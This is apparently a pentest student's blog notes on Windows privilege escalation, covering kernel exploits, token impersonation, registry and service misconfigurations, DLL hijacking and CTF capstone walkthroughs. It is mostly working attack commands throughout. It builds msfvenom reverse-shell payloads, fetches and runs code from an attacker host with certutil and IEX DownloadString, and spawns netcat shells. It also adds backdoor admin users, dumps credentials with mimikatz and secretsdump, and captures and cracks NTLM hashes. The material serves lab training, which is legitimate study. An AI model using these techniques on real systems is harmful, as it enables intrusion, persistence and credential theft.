---
title: "5 - Windows Privilege Escalation"
classes: single
header:  
  teaser: /assets/images/posts/pnpt/pnpt-teaser.jpg
  overlay_image: /assets/images/main/header2.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Elevate and Conquer: Windows Privilege Escalation Strategies."
description: "Navigating Windows Privesc Techniques: Kernel Exploits, Impersonation, Registry, DLL Hijacking and More "
categories:
  - notes
  - pnpt
tags:
  - beginner
  - pentest
  - windows
  - privesc
toc: true
---

**Resources**:

THM :https://tryhackme.com/room/windowsprivescarena

Git: https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources

Fuzzy Security Guide:  https://www.fuzzysecurity.com/tutorials/16.html

PayloadsAllTheThings Guide: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Sushant 747's Guide (Country dependant - may need VPN): https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


# Initial Enumeration



## System Enumeration
```powershell
getuid
sysinfo
```

in Windows:
```powershell
systeminfo | findstr /B /C: "OS Name" /C: "OS Version" /C:"System Type"

# wmic ( windows manager instrumentation command line ) 
# qfe ( quick fix engineering ) 
# to see whats patched

wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk get caption,description,providername
```

## User Enumeration

in Windows:
```powershell
whoami
whoami /priv
whoami /groups
net user
net user <specific user>
net localgroup <group>
```

## Network Enumeration
```powershell
ipconfig /all
arp -a
route print
netstat -ano
```


## Password Enumeration
```powershell
findstr /si password *.txt *.ini *.config <looks at the current directory>
findstr /spin "password" *.*
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
dir c:\ /s /b | findstr /si *vnc.ini
```



## AV Enumeration

Service controller:
```powershell
sc query windefend
sc queryex type= service
```

Firewall:
```powershell
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```


# Automated Tools

WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Sherlock - https://github.com/rasta-mouse/Sherlock

Watson - https://github.com/rasta-mouse/Watson

PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

JAWS - https://github.com/411Hall/JAWS

Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

Seatbelt - https://github.com/GhostPack/Seatbelt

SharpUp - https://github.com/GhostPack/SharpUp


## Tools for enumeration

Executables:
```powershell
winpeas.exe
Seatbelt.exe (compile)
Watson.exe (compile)
SharpUp.exe (compile)
```

PowerShell:
```powershell
Sherlock.ps1
PowerUp.ps1
jaws-enum.ps1
```

Other:
```powershell
windows-exploit-suggester.py (local)
exploit suggester (metasploit)
```



### Executing

in Metasploit:
```powershell
cd c:\\windows\\temp
upload <path/winpeas.exe>
load powershell
run post/multi/recon/local_exploit_suggester
```

in shell:
```powershell
powershell -ep bypass
powerup.ps1
```

> if powershell and winpeas are not avaiable to use

in Kali: 
```powershell
# https://github.com/AonCyberLabs/Windows-Exploit-Suggester
./windows-exploit-suggester.py --update
pip install xlrd --upgrade

# 'if u dont have pip' > curl http://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
./windows-exploit-suggester.py --database <db.xls> --systeminfo <sysinfo file>
```


# Escalation Path: Kernel Exploits

Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits


## Kernel
- Is a computer program that controls everything in the system
- Facilitates interactions between hardware and software components 
- A translator

### In metasploit
```
after run suggester / winpeas / powerup, we have an idea which kernel exploits we can try
background the session
so we search in metasploit example: exploit/windows/local/ms10_015_kitrap0d
set options > run
```

### Manually
```bash
msfvenom -p windows/shell_reverse_tcp lhost=<kali ip> lport=<port> -f aspx > shell.aspx
nc -lvnp <port> = set a listener	

# MS10-059 Exploit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
```

> transfer the exploit to the windows target machine

in kali:
```python
python3 -m http.server 80 
```

in windows:
```powershell
cd c:\Windows\Temp
certutil -urlcache -f http://<kali ip>/<file> <output name>
exploit.exe <kali ip> <port>
```

in kali:
```bash
nc -lvnp <port>
```

> run & get root access




# Escalation Path: Passwords and Port Forwarding



## chatterbox - hack-the-box
Achat Exploit - https://www.exploit-db.com/exploits/36025

Achat Exploit (Metasploit) - https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof

We can modify the payload to shell_reverse_tcp and add lhost, lport and set new target ip

Fire the msfvenom again after the modifications and change the payload:
```
- open a listener = netcat
- run the exploit
```

### Enum
```powershell
systeminfo
net users
net user <user>
ipconfig
netstat -ano
```

### Hunting passwords
```powershell
reg query HKLM /f password /t REG_SZ /s
```

If a password shows here, we can copy the register path of the file to show more info:
```powershell
ref query <reg path of the pwd found>
```

> Got username and a password

Here we need to think the available options:
```
- is ssh open?
- is smb available? so we can use psexec attack?
- perhaps password reuse?
```

### Port Forwarding
Plink Download - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

Download plink with the same version of your target

Send the file to the target:
```
# open a python server
# receive the file

certutil -urlcache -f http://<kali ip>/<file> <output name>
```

```
- modify the /etc/sshd_config
- set PermitRootLogin yes
- service ssh restart
- service ssh start
```

in Target:
```powershell
plink.exe -l <kali user> -pw <kali password> -R <port we want to forward>:127.0.0.1:<kali port to receive> <kali ip>
```

We should gain a kali root shell:
```
netstat -ano = to show if the port sent is open now
winexe -U Administrator%<password reuse> //127.0.0.1 "cmd.exe"
```

> hit enter a couple of times, if the shell gets stuck

- we should have root access in the windows machine
- if we want to improve the shell, we could send a netcat to the target and get the connection 


# Escalation Path: Windows Subsystem for Linux

Spawning a TTY Shell - https://netsec.ws/?p=337

Impacket Toolkit - https://github.com/SecureAuthCorp/impacket


## Overview
EoP - Windows Subsytem For Linux (WSL)

With root privileges WSL allows users to create a bind shell on any port (no elevation needed). 

Dont know the root password? No problem, just set the default user to root W/ **.exe --default-user root**.

Now Start your bind shell or reverse.

if u find user/password and the machine has smb

try psexec/smbexec/wmiexec:
```bash
psexec.py <user:'password'@target ip>
```

> it wil test your credential.

Rev shell in PHP:
```php
<?php
system('nc.exe -e cmd.exe <kali ip> <port>')
>
```

### Escalation via WSL
```powershell
where /R c:\windows bash.exe
where /R c:\windows  wsl.exe

<full path of wsl> whoami
<full path of wsl> python -c 'bind or reverse shell python code'
```

If we execute the bash.exe, we are gonna be inside the WSL using Linux:

- Get a better shell with **pty.spawn**
- Look at the **history**


# Impersonation and Potato Attacks


Rotten Potato - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

Juicy Potato - https://github.com/ohpe/juicy-potato


## What are tokens?
Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

### Two types
Delegate:
```
Created For logging into a machine or using Remote Desktop
```

Impersonate:
```
"non-interactive" such as attaching a network drive or a domain logon script
```

### Token Impersonation
in meterpreter:
```
- getuid
- load incognito
- list_tokens -u
- impersonate_token <domain\\user>
- shell
```

> When we try to dump LSA for example and we dont have access. We can try impersonate other user and execute as we were him/her 

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer <DC.domain.local>

privilege::debug
LSADump::LSA /patch
```

### Impersonation Privileges
meterpreter:
```bash
getprivs
```
shell:
```powershell
whoami /priv
```

```powershell
SeAssignPrimaryToken
SeImpersonatePrivilege
SeTakeOwnership
```

#### Potato Attacks
if these are available, we can try juicy potato / rotten potato

```powershell
SeAssignPrimaryToken
SeImpersonatePrivilege
```

## Jeeves htb
Groovy Reverse Shell - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

in jenkings:
```
# search for Script Console
# there is a rev shell using groovy, change ip/port and set a listener

# save the systeminfo in case you need to run windows-exploit-suggester.py
./windows-exploit-suggester.py --database <db.xls> --systeminfo <systeminfo file>
```

> if u find vulns related to potato / hot potato / rotten potato. Try these first, cause they are gold


msfconsole

use exploit/multi/script/web_delivery:
```bash
set payload to windows/meterpreter/reverse_tcp
set target to psh (powershell)
set lhost, srvhost
```

> it will generate a payload For us
run this payload in the machine, it should generate a session in our meterpreter

```bash
run /post/multi/recon/local_exploit_suggester
```

## Escalation
Background the session:
```bash
use exploit/windows/local/ms16_075_reflection
set options
run
```

meterpreter shell:
```bash
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
# root access
```

### Alternate Data Streams
https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/


> There is regular data stream and alternate data stream
Alternate is a way to hide information within a file

```bash
dir /R
hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
```


# Escalation Path: getsystem

What happens when I type getsystem? - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

In meterpreter:
```bash
getsystem
getsystem -h
```

What getsystem does?

> there is 2 types of **named pipe impersonation**. One is in memory and other is in disk ( probably u should not run this, because AV detects )
and there is **Token Duplication**, that requires **SeDebugPrivileges** to be enable.





# Escalation Path: RunAs 



## Overview
Allow us to run a command as somebody else

### FootHold - Access htb
Enter the FTP, grab the files
```bash
mdb-sql <db.mdb> 
```

open auth_user
```bash
readpst <pst file>
```

- grab user and password
- login through telnet



### Escalation
```powershell
cmdkey /list

C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```



# Escalation Path: Registry



## Overview of Autoruns
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

Run powerUp to identify the autorun vulnerabilty:
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

### Escalation via Autorun
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o program.exe
```

in msfconsole:
```bash
use multi/handler > set options
```

Send the program.exe to windows target machine and replace the windows file **/Program Files/Autorun Program/program.exe** by our program.exe

- Now we can disconnect off the machine and log as administrator
- the autorun program will pop up. 
- When u hit RUN, we get the meterpreter shell with root access




## AlwaysInstallElevated
This is a configuration issue, when we can run packages with admin privileges, because **install elevated** is set in the register
 
### Overview
To test if this vulnerability is available:
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
the value of 'AlwaysInstallElevated' must be 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
again the value must be 1
```

### Escalation
```powershell
# We can see the AbuseFunction in the PowerUp > Invoke-AllChecks
# example: AbuseFunction : Write-UserAddMSI

In Powershell:
Write-UserAddMSI
```

> A file UserAdd is gonna appear in the same directory of the PowerUp
We will run this file. A window will pop up and we will set a backdoor user to have administrator access

### with Meterpreter
```bash
use exploit/multi/handler
set options

msfvenom -p windows/meterpreter/reverse_tcp lhost=<our ip> -f msi -o setup.msi
# send to the windows target machine.
# make sure u have a listener running & run the setup.msi
```

### Another method
with meterpreter:
```bash
use exploit/windows/local/always_install_elevated
set the session
```


## Regsvc ACL Overview
We are gonna test if we have full control over a register key.

If the answer is oui, we can compile a malicious executable writen in C and make that executable run a command

### Detection
in powershell:
```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# The correct output should be: our current user has FullControl
```

### Escalation
In kali open a FTP server:
```bash
python -m pyftpdlib -p 21 --write
```

In Windows:
```bash
# send the file. 
ftp <kali ip> > log with anonymous > put windows_service.c
```

In kali with the file in hand:
```bash
# we are gonna edit
# replace the command in the payload session > system("here")

cmd.exe /k net localgroup administrator user /add
```

> use **sudo apt install gcc-mingw-w64** if needed

```powershell
x86_x64-w64-mingw32-gcc windows_service.c -o x.exe
```

Send the x.exe to the C:\Temp of the Windows Machine:
```powershell
reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
net localgroup administrators
# the 'user' got added
```



# Escalation Path: Executable Files


## Detection

### With PowerUp
```powershell
# we will run <. .\PowerUp.ps1>
Invoke-AllChecks
```

### Manual Detection
```bash
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

Notice that the **everyone** user group has **FILE_ALL_ACCESS** permission on the filepermservice.exe file.


### Escalation
We will generate the same malicious file:
```bash
x86_x64-w64-mingw32-gcc windows_service.c -o x.exe
# send the x.exe
```

Then replace the filepermservice.exe file:
```bash
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc	
net localgroup administrators
```

> The user has been added to the administrator group.
We have root access through this user.




# Escalation Path: Startup Application

icacls Documentation - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

## Overview
Same concept as the autorun attack, when we boot up our machine an application is gonna to startup.

We will use a malicious file to take advantage of that and get shell

Sadly we wont find this vulnerability with PowerUp.

### Detection
```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

From the output notice that the "BUILTIN\Users" group has Full access '(F)' to the directory

# F = full access
# M = modify access
# RX = read and execute access
# R = read-only access
```

### Escalation
msfconsole listener:
```bash
use multi/handler
set options

msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o y.exe
```

Send the exploit to the target machine.

> Again, we can open a FTP or web server with python in kali
Grab with **certutils** or just open in the browser


Save the exploit in the startup folder:
```bash
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

> Boot the machine again & just waits with a msfconsole listener to receive the connection







# Escalation Path: DLL Hijacking



## DLL Hijacking Overview

Dll = dynamic link library 

we are looking For a dll that is trying to load and has the name not found;

- if we have a writable directory For that dll then
- we can hijack that dll by sending a malicious file in that path.

### Escalation
Run process monitor:
```bash
include to filter > Result is NAME NOT FOUND & Path ends with .dll

sc stop dllsvc
sc start dllsvc
```

grab the windows_dll.c file and edit:
```bash
System("cmd.exe /k net localgroup administrators userBatman /add");
```

Compile it:
```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

Send to the target:
```bash
# python server > grab the file
# save the file in a directory you have write access : like C:\Temp\

sc stop dllsvc
sc start dllsvc
```



# Escalation Path: Service Permissions


## Escalation via Binary Paths

### Find with PowerUp
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

### Find manually
```bash
accesschk64.exe -uwcv Everyone *

# -u = dont show errors
# -w = only show the objects that have write access
# -c = display the service name
# -v = verbose
```

Then run against the service itself:
```bash
accesschk64.exe -uwcv daclsvc
sc qc daclsvc

# if we have write access to the SERVICE_CHANGE_CONFIG
sc config daclsvc binpath= "net localgroup administrators user /add"

sc stop daclsvc
sc start daclsvc

net localgroup administrator 
# The user should be there with admin access
```


## Unquoted Service Paths
if you have a service executable which path is not closed with quotation marks and contains a space

then you can get malicious, cause when the service is unquoted, Windows search For the .exe in every space of the ImagePath.

Example:

C:\Program**x**Files\Unquoted**x**Path**x**Service\Common**x**Files\etc

in every **x** we can put a .exe file and the Windows will run.

- We just gotta find one directory that we have write access.


### Can be found with PowerUp
```bash
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

Open a listener: 
```bash
multi/handler > set options
or netcat -lvnp <port>
```

For meterpreter
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o common.exe
```

For netcat:
```bash
msfvenom -p windows/reverse_tcp lhost=<kali ip> -f exe -o common.exe
```

- send to the target machine
- save in the path of the unquoted vulnerability

```bash
sc start unquotedsvc
```

> we should get a shell back

## SteelMountain from TryHackMe

HFS - http file server

```bash
- Find the version and search in meterpreter
- run the exploit
- get shell
```

### Escalation Metasploit
```bash
upload <powershell.ps1> 
we can: echo 'Invoke-AllChecks' >> PowerUp.ps1
After upload: powershell -ep bypass .\PowerUp.ps1
```

```bash
powerup found unquoted service > AdvancedSystemCareService9
```

so we can:
```bash
sc query <service> # to see more details of it

sc stop <service>
```

set a listener:
```bash
multi/handler
set options
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o ASCService.exe
# we can upload through meterpreter

upload <exploit>
# and save in the unquoted path that is vulnerable

sc start <service>
```

> we should get a shell.


### Escalation Manual

search the exploit using:
```bash
searchsploit HFS 2.3
grab the python with remote code execution
change ip and port in the script


# set a listener in kali: nc -lvnp <port>
```

we need open a web server in the same directory as our nc.exe:
```bash
python -m http.server 80 
```

Then execute the exploit:
```bash
python 39161.py <kali ip> 8080
```

> we should get a shell with user access in our netcat.

Grab the winpeas.exe:
```bash
certutil -urlcache -f http://<kali ip>/winPEAS64.exe winpeas.exe
```


- run winpeas
- we should find the unquoted service
- we will generate with msfvenom again and send to the path of the vulnerable unquoted file

```bash
msfvenom -p windows/shell_reverse_tcp lhost=<kali ip> lport=<port> -f exe -o ASCService.exe

# send to the machine with the same method:
python -m http.server
certutils -urlcache -f http://<kali ip>/ASCService.exe ASCService.exe

sc stop <service>
sc start <service>
```

> make sure you have a listener
and we should get a shell with admin privileges


# Escalation Path: CVE-2019-1388

Zero Day Initiative CVE-2019-1388 - https://www.youtube.com/watch?v=3BQKpPNlTSo

Rapid7 CVE-2019-1388 - https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388


## Overview

An elevation of privilege vulnerability exists in Windows Certificate Dialog when it does not properly enforce user privileges.

We get the first access with enumeration. Found the credentials in the website

### Escalation
We are gonna restore the file that is in the recycle bin

thats reference to our vulnerability cve-2019-1388

we can confirm this by looking at browser history

so we are gonna run this with admin privileges

even tho we do not have the admin credentials

Then we click: **Show more details**

Then: **Show information about the publishers certificate**

> This is where the vulnerability take place
because it will open the browser as SYSTEM

We click: Issued by **publishers CA**

Close the program windows and go to the browser

In the browser:
```bash
go to config/preferences > file > save as...
# ignore errors
```

Type in the file name bar:
```bash
c:\Windows\System32\*.*
all system32 files will appear
search For the **cmd.exe**
right click > open
whoami
```

> we are root


# Capstone

- 5 machines

	Arctic (HTB)
	
	Bastard (HTB)
	
	Alfred (THM)
	
	Bastion (HTB)
	
	Querier (HTB)



## Arctic
```bash
nothing new. 
enumeration...
a vulnerable service
searchsploit <service>
run and get a shell
then run something like powerup, windows_vulnerability_check whatever
vuln MS010-059 exploit, run > root
```

## Bastard
Basic PowerShell For Pentesters - https://book.hacktricks.xyz/windows/basic-powershell-fFor-pentesters

- This time we are gonna run Sherlock.ps1

Add this to the last line:
```bash
echo 'Find-AllVuns' >> Sherlock.ps1
```

> MS15-051 found.
search in For exploit in git or exploit-db

Send the ms15-051 exploit & nc.exe to the machine
then:
```bash
ms15-051.exe "nc.exe <kali ip> <port> -e cmd.exe"
# open a listener
```

## Alfred
```bash
jenkins > admin:admin
projects > build command
nishang
systeminfo
msfconsole listener
msfvenom windows payload

# Grab the file:
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<kali ip>/shell.exe', 'shell.exe')"
python web server etc

# To start the exploit:
Start-Process "shell.exe"

load incognito
getprivs
list-tokens -u

# Lets try to impersonate the aythority\system
impersonate_token "NT AUTHORITY\SYSTEM"
getuid
root
```

> sometimes we have system, but we cant get into shell or use commands
so, we need to migrate to another process that is running as system

```bash
migrate <svchost.exe PID>
```

## Bastion
Mounting VHD Files - https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25

we are gonna to mount the smb, then mount the VHD file. Then we search For the SAM file.
```bash
# C:\WIndows\System32\SAM | SECURITY | SYSTEM

secretdump.py -sam <sam file> -security <security file> -system <system file> LOCAL
```

```bash
- search mRemoteNg -
- search where the passwords are stored -
- grab the passwords
- grab a mRemoteNG decrypt tool from github
- crack the admin password
- root
```

> hard .-. 

## Querier
Capturing MSSQL Credentials - https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
```bash
# binwalk = to see what files are inside another file
# its used in steganography a lot, but we can use in files also
binwalk -e <file> 
```
```bash
impacket/mssqlclient.py <domain/username:password@<target ip> -windows-auth
```

in SQL:
```bash
SQL > enable_xp_cmdshell
```

in Kali:
```bash
mkdir share
impacket/smbserver.py -smb2support share share/
```

in SQL:
```bash
exec xp_dirtree '\\<kali ip\share\',1,1
```

> This should give us a hash in our smbserver (NTLMv2 hash)

- copy the hash in a txt
- and try to crack with john

```bash
john --show --format=netntlmv2 hash.txt -w=/rockyou.txt
hashcat -m 5600 hash.txt rockyou.txt -O
```

in SQL:
```bash
SQL > enable_xp_cmdshell
```

If we can enable the shell in SQL, we can execute commands:
```bash
SQL> xp_cmdshell dir c:\
# upload a netcat and get a better shell
# open a web server in kali, to send a file

xp_cmdshell powershell -c Invoke-WebRequest "http://<kali ip>/nc.exe" -OutFile "C:\<path>\nc.exe"
xp_cmdshell C:\<path>\nc.exe <kali ip> <port> -e cmd.exe
```

> we get a user shell

```bash
# open a web server again: Inside the directory that has PowerUp.ps1 | winpeas | sherlock etc
python -m http.server
```

This will download and execute the powerup from our web server:
```bash
echo IEX(New-Object Net.WebClient).DownloadString('http://<kali ip>:80/PowerUp.ps1') | powershell -noprofile -
```

if u find a vulnerable service:
```bash
sc qc <service>
```

We can change de binary path and exploit using netcat:
```bash
sc config <service> binpath= "C:\path\nc.exe <kali ip> <port> -e cmd.exe"
sc qc <service> =to visualize the new binpath
```

open a listener
```bash
sc stop <service>
sc start <service>
```

> we should get a shell back

